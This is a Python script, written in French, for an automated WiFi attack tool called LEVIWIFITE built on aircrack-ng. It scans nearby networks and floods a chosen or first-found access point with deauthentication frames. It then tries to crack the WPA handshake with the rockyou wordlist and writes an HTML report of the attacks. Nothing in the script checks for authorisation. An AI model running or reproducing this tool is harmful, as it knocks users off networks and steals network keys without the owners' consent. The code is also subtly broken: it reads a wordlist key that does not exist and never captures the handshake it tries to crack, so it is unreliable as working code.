#!/usr/bin/env python3
"""
LEVIWIFITE - Outil de Pentest WiFi Avancé
Combinaison de Wifite + Airgeddon avec coordination multi-langage
"""

import os
import sys
import subprocess
import json
import time
import threading
from datetime import datetime
import argparse
import signal

class LeviWifite:
    def __init__(self):
        self.targets = []
        self.current_attack = None
        self.attack_history = []
        self.config = self.load_config()
        
    def load_config(self):
        """Charge la configuration depuis config.json"""
        try:
            with open('config.json', 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            return self.default_config()
    
    def default_config(self):
        """Configuration par défaut"""
        return {
            "interface": "wlan0",
            "monitor_mode": True,
            "attack_timeout": 300,
            "wordlist_path": "/usr/share/wordlists/rockyou.txt",
            "output_dir": "results",
            "log_level": "INFO"
        }
    
    def start_monitor_mode(self):
        """Active le mode monitor sur l'interface"""
        print("[+] Activation du mode monitor...")
        try:
            subprocess.run(['airmon-ng', 'start', self.config['interface']], check=True)
            print(f"[+] Mode monitor activé sur {self.config['interface']}")
            return True
        except subprocess.CalledProcessError:
            print(f"[-] Erreur lors de l'activation du mode monitor")
            return False
    
    def scan_networks(self):
        """Scanne les réseaux WiFi disponibles"""
        print("[+] Scan des réseaux WiFi...")
        try:
            result = subprocess.run(['airodump-ng', self.config['interface'], '--output-format', 'csv'], 
                                 capture_output=True, text=True, timeout=30)
            networks = self.parse_airodump_output(result.stdout)
            self.targets = networks
            print(f"[+] {len(networks)} réseaux trouvés")
            return networks
        except subprocess.TimeoutExpired:
            print("[-] Timeout du scan")
            return []
    
    def parse_airodump_output(self, output):
        """Parse la sortie d'airodump-ng"""
        networks = []
        lines = output.split('\n')
        for line in lines:
            if line.strip() and ',' in line:
                parts = line.split(',')
                if len(parts) >= 14 and parts[0].strip():
                    try:
                        bssid = parts[0].strip()
                        essid = parts[13].strip()
                        channel = parts[3].strip()
                        power = parts[8].strip()
                        if bssid and bssid != 'BSSID':
                            networks.append({
                                'bssid': bssid,
                                'essid': essid,
                                'channel': channel,
                                'power': power
                            })
                    except IndexError:
                        continue
        return networks
    
    def deauth_attack(self, target):
        """Attaque de déauthentification"""
        print(f"[+] Attaque de déauthentification sur {target['essid']} ({target['bssid']})")
        try:
            cmd = ['aireplay-ng', '--deauth', '0', '-a', target['bssid'], self.config['interface']]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.current_attack = process
            return process
        except Exception as e:
            print(f"[-] Erreur lors de l'attaque: {e}")
            return None
    
    def crack_handshake(self, target, handshake_file):
        """Crack le handshake capturé"""
        print(f"[+] Tentative de crack du handshake pour {target['essid']}")
        try:
            cmd = ['aircrack-ng', handshake_file, '-w', self.config['config']['wordlist_path']]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            if 'KEY FOUND!' in result.stdout:
                print(f"[+] Clé trouvée pour {target['essid']}!")
                return True
            else:
                print(f"[-] Clé non trouvée pour {target['essid']}")
                return False
        except subprocess.TimeoutExpired:
            print(f"[-] Timeout du crack pour {target['essid']}")
            return False
    
    def run_attack_sequence(self, target):
        """Exécute la séquence d'attaque complète"""
        print(f"\n[+] Début de l'attaque sur {target['essid']}")
        
        # 1. Déauthentification
        deauth_process = self.deauth_attack(target)
        if not deauth_process:
            return False
        
        # 2. Capture du handshake
        print("[+] Capture du handshake...")
        time.sleep(10)  # Attendre la capture
        
        # 3. Arrêt de la déauthentification
        if deauth_process:
            deauth_process.terminate()
        
        # 4. Tentative de crack
        handshake_file = f"handshake_{target['bssid'].replace(':', '')}.cap"
        if os.path.exists(handshake_file):
            success = self.crack_handshake(target, handshake_file)
            self.attack_history.append({
                'target': target,
                'timestamp': datetime.now().isoformat(),
                'success': success
            })
            return success
        
        return False
    
    def generate_report(self):
        """Génère un rapport HTML des attaques"""
        print("[+] Génération du rapport...")
        
        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Rapport LeviWifite</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .header {{ background: #2c3e50; color: white; padding: 20px; border-radius: 5px; }}
                .target {{ border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 5px; }}
                .success {{ border-left: 5px solid #27ae60; }}
                .failure {{ border-left: 5px solid #e74c3c; }}
                .stats {{ background: #ecf0f1; padding: 15px; border-radius: 5px; margin: 20px 0; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>🚀 LEVIWIFITE - Rapport de Pentest</h1>
                <p>Généré le: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            </div>
            
            <div class="stats">
                <h2>📊 Statistiques</h2>
                <p>Total des cibles: {len(self.targets)}</p>
                <p>Attaques réussies: {len([a for a in self.attack_history if a['success']])}</p>
                <p>Attaques échouées: {len([a for a in self.attack_history if not a['success']])}</p>
            </div>
            
            <h2>🎯 Cibles Scannées</h2>
        """
        
        for target in self.targets:
            html_content += f"""
            <div class="target">
                <h3>{target['essid'] or 'SSID Caché'}</h3>
                <p><strong>BSSID:</strong> {target['bssid']}</p>
                <p><strong>Canal:</strong> {target['channel']}</p>
                <p><strong>Puissance:</strong> {target['power']}</p>
            </div>
            """
        
        html_content += """
            <h2>⚔️ Historique des Attaques</h2>
        """
        
        for attack in self.attack_history:
            status_class = "success" if attack['success'] else "failure"
            status_text = "✅ Succès" if attack['success'] else "❌ Échec"
            html_content += f"""
            <div class="target {status_class}">
                <h3>{attack['target']['essid'] or 'SSID Caché'}</h3>
                <p><strong>Statut:</strong> {status_text}</p>
                <p><strong>Timestamp:</strong> {attack['timestamp']}</p>
                <p><strong>BSSID:</strong> {attack['target']['bssid']}</p>
            </div>
            """
        
        html_content += """
        </body>
        </html>
        """
        
        with open('rapport_leviwifite.html', 'w') as f:
            f.write(html_content)
        
        print("[+] Rapport généré: rapport_leviwifite.html")
    
    def cleanup(self):
        """Nettoyage et arrêt propre"""
        print("\n[+] Nettoyage en cours...")
        
        if self.current_attack:
            self.current_attack.terminate()
        
        # Désactiver le mode monitor
        try:
            subprocess.run(['airmon-ng', 'stop', self.config['interface']], check=True)
            print("[+] Mode monitor désactivé")
        except:
            pass
        
        # Générer le rapport final
        self.generate_report()
        print("[+] Nettoyage terminé")

def signal_handler(signum, frame):
    """Gestionnaire de signal pour arrêt propre"""
    print("\n[!] Signal d'arrêt reçu. Nettoyage...")
    if hasattr(signal_handler, 'leviwifite'):
        signal_handler.leviwifite.cleanup()
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description='LEVIWIFITE - Outil de Pentest WiFi Avancé')
    parser.add_argument('-i', '--interface', default='wlan0', help='Interface WiFi')
    parser.add_argument('-t', '--target', help='BSSID spécifique à attaquer')
    parser.add_argument('--auto', action='store_true', help='Mode automatique')
    parser.add_argument('--scan-only', action='store_true', help='Scan uniquement')
    
    args = parser.parse_args()
    
    # Configuration du gestionnaire de signal
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Initialisation
    leviwifite = LeviWifite()
    signal_handler.leviwifite = leviwifite
    
    if args.interface:
        leviwifite.config['interface'] = args.interface
    
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║                    🚀 LEVIWIFITE 🚀                        ║
    ║              Outil de Pentest WiFi Avancé                  ║
    ║              Wifite + Airgeddon + Coordination             ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    try:
        # Activation du mode monitor
        if not leviwifite.start_monitor_mode():
            print("[-] Impossible d'activer le mode monitor. Arrêt.")
            return
        
        # Scan des réseaux
        networks = leviwifite.scan_networks()
        if not networks:
            print("[-] Aucun réseau trouvé. Arrêt.")
            return
        
        # Affichage des réseaux
        print("\n📡 Réseaux WiFi détectés:")
        for i, network in enumerate(networks):
            print(f"  {i+1}. {network['essid'] or 'SSID Caché'} - {network['bssid']} (Canal {network['channel']})")
        
        if args.scan_only:
            return
        
        # Sélection de la cible
        if args.target:
            target = next((n for n in networks if n['bssid'] == args.target), None)
            if not target:
                print(f"[-] Cible {args.target} non trouvée")
                return
        else:
            if args.auto:
                target = networks[0]  # Première cible
            else:
                try:
                    choice = int(input(f"\n🎯 Choisissez une cible (1-{len(networks)}): ")) - 1
                    target = networks[choice]
                except (ValueError, IndexError):
                    print("[-] Choix invalide")
                    return
        
        print(f"\n[+] Cible sélectionnée: {target['essid']} ({target['bssid']})")
        
        # Exécution de l'attaque
        success = leviwifite.run_attack_sequence(target)
        
        if success:
            print(f"\n🎉 Attaque réussie sur {target['essid']}!")
        else:
            print(f"\n💥 Attaque échouée sur {target['essid']}")
        
    except KeyboardInterrupt:
        print("\n[!] Interruption utilisateur")
    except Exception as e:
        print(f"\n[-] Erreur: {e}")
    finally:
        leviwifite.cleanup()

if __name__ == "__main__":
    main()
